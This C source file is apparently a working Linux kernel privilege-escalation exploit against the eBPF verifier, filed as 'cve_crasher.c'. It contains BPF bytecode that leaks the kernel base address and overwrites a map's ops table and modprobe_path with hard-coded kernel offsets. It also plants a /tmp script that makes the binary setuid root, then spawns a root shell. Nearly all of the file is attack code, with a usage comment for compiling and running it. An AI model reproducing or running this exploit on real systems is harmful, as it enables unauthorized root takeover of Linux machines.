#define _GNU_SOURCE
#include <err.h>
#include <stdint.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

#define ARRAY_MAP_OPS 16867712
#define ARRAY_OF_MAP_OPS 16866432
#define MODPROBE_PATH 23358912

#define BPF_JMP32 0x06
#define BPF_JLE		0xb0	/* LE is unsigned, '<=' */
/* start from kernel */
#define BPF_EMIT_CALL(FUNC)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP | BPF_CALL,            \
        .dst_reg = 0,                   \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = (FUNC) }) /* ??? */
#define BPF_MOV32_IMM(DST, IMM)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_MOV | BPF_K,     \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = IMM })
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_PSEUDO_MAP_FD   1
#define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_LD | BPF_DW | BPF_IMM,     \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = (__u32) (IMM) }),          \
    ((struct bpf_insn) {                    \
        .code  = 0, /* zero is reserved opcode */   \
        .dst_reg = 0,                   \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_ALU32_IMM(OP, DST, IMM)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = IMM })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_ALU32_REG(OP, DST, SRC)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = 0 })
#define BPF_EXIT_INSN()                     \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP | BPF_EXIT,            \
        .dst_reg = 0,                   \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = 0 })
/* Memory store, *(uint *) (dst_reg + off16) = src_reg */
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
    ((struct bpf_insn) {                    \
        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = OFF,                   \
        .imm   = 0 })
#define BPF_REG_FP  BPF_REG_10
#define BPF_MOV64_REG(DST, SRC)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = IMM })
#define BPF_MOV64_REG(DST, SRC)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
        .dst_reg = DST,                 \
        .src_reg = SRC,                \
        .off   = 0,                 \
        .imm   = 0 })
#define BPF_REG_TMP BPF_REG_8
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
    ((struct bpf_insn) {                    \
        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = OFF,                   \
        .imm   = 0 })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)              \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = OFF,                   \
        .imm   = IMM })
#define BPF_JMP32_IMM(OP, DST, IMM, OFF)              \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP32 | BPF_OP(OP) | BPF_K,      \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = OFF,                   \
        .imm   = IMM })
#define BPF_MOV64_IMM(DST, IMM)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = 0 })
#define BPF_MOV32_REG(DST, SRC)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_MOV | BPF_X,     \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = 0 })
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)			\
	((struct bpf_insn) {					\
		.code  = CODE,					\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = IMM })
#define BPF_JMP_REG(OP, DST, SRC, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)
/* end from kernel */

unsigned long kern_base = 0;
int bpf_(int cmd, union bpf_attr *attrs) {
    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

void array_get(int mapfd, uint32_t key, void* value) {
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key    = (uint64_t)&key,
        .value  = (uint64_t)value,
    };


    int res = bpf_(BPF_MAP_LOOKUP_ELEM, &attr);
    if (res)
        err(1, "map update elem");
}

void array_set(int mapfd, uint32_t key, void* value) {
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key    = (uint64_t)&key,
        .value  = (uint64_t)value,
        .flags  = BPF_ANY,
    };


    int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
    if (res)
        err(1, "map update elem");

}

int run_bpf_code(int mapfd, struct bpf_insn* insns, unsigned int cnt) {
    char verifier_log[100000];
    union bpf_attr create_prog_attrs = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = cnt,
        .insns = (uint64_t)insns,
        .license = (uint64_t)"",
        .log_level = 2,
        .log_size = sizeof(verifier_log),
        .log_buf = (uint64_t)verifier_log
    };
    int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
    if (progfd == -1) {
        perror("prog load");
        puts(verifier_log);
        return 1;
    }

    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
        err(1, "socketpair");
    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
        err(1, "setsockopt");
    if (write(socks[1], "aa", 2) != 2)
        err(1, "write");
}

unsigned long get_kern_base(void) {
    union bpf_attr create_map_attrs = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 0x250,
        .max_entries = 10
    };
    int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
    if (mapfd == -1)
        err(1, "map create");


    unsigned long vals[0x250/8];
    vals[0] = 2;
    vals[1] = 0;
    memset(&vals[2], 'A', 0x250-8*2);
    array_set(mapfd, 0, vals);

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
        // fill r0 with pointer to map value
        BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack
        BPF_MOV32_IMM(BPF_REG_ARG2, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
        BPF_EXIT_INSN(), // exit

        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),

        BPF_JMP_IMM(BPF_JGE, BPF_REG_2, 1, 2),
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0),

        BPF_MOV64_IMM(BPF_REG_3, 0x1),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 1),

        BPF_JMP_REG(BPF_JLE, BPF_REG_2, BPF_REG_3, 2),
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0),

        BPF_JMP32_IMM(BPF_JNE, BPF_REG_2, 5, 2),
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0),

        BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 2),
        BPF_ALU64_IMM(BPF_RSH, BPF_REG_2, 1),

        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 8),

        BPF_ALU64_IMM(BPF_MUL, BPF_REG_2, 0x110),

        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_2),
        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_0, 0),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_2),
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_4, 0),

        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };
    run_bpf_code(mapfd, insns, sizeof(insns) / sizeof(insns[0]));
    unsigned long val2[0x250/8];
    array_get(mapfd, 0, &val2);
    printf("got leak %p\n", val2[0]);
    return val2[0]-ARRAY_MAP_OPS;
}

unsigned long write_modprobe_path(void) {
    union bpf_attr create_map_attrs = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 0x250,
        .max_entries = 10
    };
    int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
    if (mapfd == -1)
        err(1, "map create");


    unsigned long vals[0x250/8];
    vals[0] = kern_base+MODPROBE_PATH;
    vals[1] = 2;
    memset(&vals[2], 'A', 0x250-8*2);
    array_set(mapfd, 0, vals);

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
        // fill r0 with pointer to map value
        BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack
        BPF_MOV32_IMM(BPF_REG_ARG2, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
        BPF_EXIT_INSN(), // exit

        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 8),

        BPF_JMP_IMM(BPF_JGE, BPF_REG_2, 1, 2),
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0),

        BPF_MOV64_IMM(BPF_REG_3, 0x1),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 1),

        BPF_JMP_REG(BPF_JLE, BPF_REG_2, BPF_REG_3, 2),
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0),

        BPF_JMP32_IMM(BPF_JNE, BPF_REG_2, 5, 2),
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0),

        BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 2),
        BPF_ALU64_IMM(BPF_RSH, BPF_REG_2, 1),

        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 8),

        BPF_ALU64_IMM(BPF_MUL, BPF_REG_2, 0x110),

        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_2),
        BPF_MOV64_IMM(BPF_REG_4, kern_base+ARRAY_OF_MAP_OPS),
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_4, 0),

        BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
        // fill r0 with pointer to map value
        BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack
        BPF_MOV32_IMM(BPF_REG_ARG2, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
        BPF_EXIT_INSN(), // exit
        BPF_LD_IMM64(BPF_REG_4, 132145145017391),
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_4, 0),

        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };
    run_bpf_code(mapfd, insns, sizeof(insns) / sizeof(insns[0]));
    return 0;
}

void write_file(char* filename, char* content) {
    int fd = open(filename, O_RDWR|O_CREAT);
    if(fd<0) {
        fprintf(stderr, "invalid open\n");
        return;
    }
    write(fd, content, strlen(content));
    close(fd);
    return;
}

int main(void)
{
    setuid(0);
    if(getuid() == 0) {
        printf("got r00t!\n");
        system("/bin/sh");
        return;
    }
    kern_base = get_kern_base();
    printf("got kernel base leak @ %p\n", kern_base);

    printf("preparing modprobe_path\n");
    system("rm /tmp/dummy 2>/dev/null");
    system("rm /tmp/x 2>/dev/null");
    write_file("/tmp/x", "#!/bin/sh\n/bin/chown root:root /home/user/crasher\n/bin/chmod u+s /home/user/crasher\nchmod g+s /home/user/crasher");
    system("chmod 755 /tmp/x");
    write_file("/tmp/dummy", "\xff\xff\xff\xff");
    system("chmod 755 /tmp/dummy");
    printf("overwriting bpf_map ops with array_of_maps_map_ops @ %p\n", kern_base+ARRAY_OF_MAP_OPS);
    printf("overwriting modprobe_path @ %p\n", kern_base+MODPROBE_PATH);
    write_modprobe_path();
    system("/tmp/dummy 2>/dev/null");
    system("/home/user/crasher");
    getchar();
}

/* Usage :
 *
 * gcc -o crasher cve_crasher.c
 * uname -a
 * ./crasher
 *
 **/
